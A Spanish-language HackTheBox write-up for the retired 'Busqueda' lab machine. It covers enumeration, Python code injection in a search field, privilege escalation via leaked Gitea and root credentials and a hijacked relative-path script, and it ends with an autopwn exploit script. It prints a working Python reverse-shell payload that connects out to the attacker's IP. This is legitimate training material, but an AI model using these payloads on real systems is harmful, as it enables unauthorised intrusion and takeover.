---
title: Busqueda
layout: page
permalink: /HTB_Busqueda
---

<h2 class="amarillo">HackTheBox - Busqueda WriteUp - Máquina retirada</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/Busqueda.png" alt="under" oncontextmenu="return false;">
</div>
Comenzamos encendiendo la maquina busqueda y nos dará la dirección IP 10.129.232.124, probamos a lanzarle cinco trazas ICMP para verificar que la maquina esta activa y de paso por el TLL identificar a que sistema operativo nos estamos enfrentando (Si Linux o Windows)
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/1.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un TLL de 63 por tanto estamos frente a una maquina Linux

<h2 class="amarillo">Enumeración</h2>

Para la enumeración comenzamos con nmap para hacer un escaneo a todo el rango de puertos identificando aquellos que estén abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.232.124
```

Y exportamos la captura de nmap en allPorts
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/2.png" alt="under" oncontextmenu="return false;">
</div>


Como unicamente vemos el puerto 22 y 80 procedemos a lanzar una serie de scripts básicos de reconocimiento para identificar la version y servicio que corren para estos puertos
```bash
nmap -p22,80 -sCV 10.129.232.124
```
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/3.png" alt="under" oncontextmenu="return false;">
</div>


Vemos un servicio http, probamos a enumerar las tecnologías que puedan estar ejecutándose en el servicio web con la herramienta whatweb
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/4.png" alt="under" oncontextmenu="return false;">
</div>


Vemos que nos esta haciendo un redirect al dominio searcher.htb, una vez agregado al /etc/hosts probamos nuevamente a enumerar con whatweb
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/5.png" alt="under" oncontextmenu="return false;">
</div>


Y ya me llama la atención que este ejecutando un Werkzeug y Python, por tanto buscamos con searchsploit si existe alguna vulnerabilidad asociada
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/6.png" alt="under" oncontextmenu="return false;">
</div>


No vemos nada interesante entonces pasamos directamente a la web que encontramos
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/7.png" alt="under" oncontextmenu="return false;">
</div>


La web nos dice que podemos hacer búsquedas desde un motor cualquiera, asi que si interceptamos la petición con BurpSuite veremos mas a detalle como se esta manejando la información
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/8.png" alt="under" oncontextmenu="return false;">
</div>


Y vemos que por POST se esta tramitando las variables engine y query
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/9.png" alt="under" oncontextmenu="return false;">
</div>


EL campo query es vulnerable a RCE con python entonces podemos probar a entablarnos una reverse shell
```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.55',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Y logramos entrar a la maquina
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/10.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Escalada</h2>

Para la escalada enumerando un poco el sistema veremos que hay un directorio oculto .git el cual cuenta con un usuario cody y nos permite acceder a un nuevo dominio **gitea.searcher.htb**
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/11.png" alt="under" oncontextmenu="return false;">
</div>


Agregando este dominio al /etc/hosts podremos acceder a Gitea
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/12.png" alt="under" oncontextmenu="return false;">
</div>


Resulta que podremos iniciar sesión como cody ya que tenemos su contraseña
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/13.png" alt="under" oncontextmenu="return false;">
</div>

Podemos probar a enumerar si tenemos algún privilegio asignado a nivel de sudoers con las credenciales de cody
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/14.png" alt="under" oncontextmenu="return false;">
</div>


Y correcto, vemos que podemos ejecutar el binario de python3 sobre un script, asi que listando un poco el contenido de este
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/15.png" alt="under" oncontextmenu="return false;">
</div>



Probamos a enumerar un poco, en especial el gitea

<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/17.png" alt="under" oncontextmenu="return false;">
</div>

Veremos un nombre de usuario de base de datos y su contraseña
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/18.png" alt="under" oncontextmenu="return false;">
</div>


`gitea:yuiu1hoiu4i5ho1uh`
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/19.png" alt="under" oncontextmenu="return false;">
</div>


También encontraremos las credenciales de un root

`root:jI86kGUuj87guWr3RyF`
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/20.png" alt="under" oncontextmenu="return false;">
</div>


Si intentamos conectarnos con mysql al contenedor docker por la 172.19.0.3 podremos hacerlo
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/21.png" alt="under" oncontextmenu="return false;">
</div>


Ya solo queda enumerar esta base de datos para encontrar alguna credencial
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/22.png" alt="under" oncontextmenu="return false;">
</div>



Y tendremos administrator y cody del servicio gitea
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/23.png" alt="under" oncontextmenu="return false;">
</div>


La cual podremos crackear :

`ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2`

Y seguido conectarnos como administrator en gitea
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/24.png" alt="under" oncontextmenu="return false;">
</div>


Revisando un poco el gitea veremos una copia legible del script que estábamos ejecutando como root, donde encontramos el vector de ataque y es que el script esta buscando en el directorio actual de trabajo el archivo ./fulll-checkup.sh
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/25.png" alt="under" oncontextmenu="return false;">
</div>


Simplemente tendremos que secuestrar ese binario creando nuestro propio full-checkup.sh malicioso que asigne el privilegio SUID a la bash
<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/26.png" alt="under" oncontextmenu="return false;">
</div>

Así habremos completado la maquina.

<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/pwned.png" alt="under" oncontextmenu="return false;">
</div>

De paso compartir el script autopwn para la maquina:
```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import signal
import sys
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Busqueda", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://searcher.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def searchorExploit(URL, IP, PORT):
    reverse = """', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#""" % (
        IP, PORT)

    data = {'engine': 'Yandex',
            'query': reverse}

    r = requests.post(URL + "/search", data=data)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=searchorExploit, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<div  style="text-align: center;">
  <img src="/assets/images/HTB/Busqueda/27.png" alt="under" oncontextmenu="return false;">
</div>

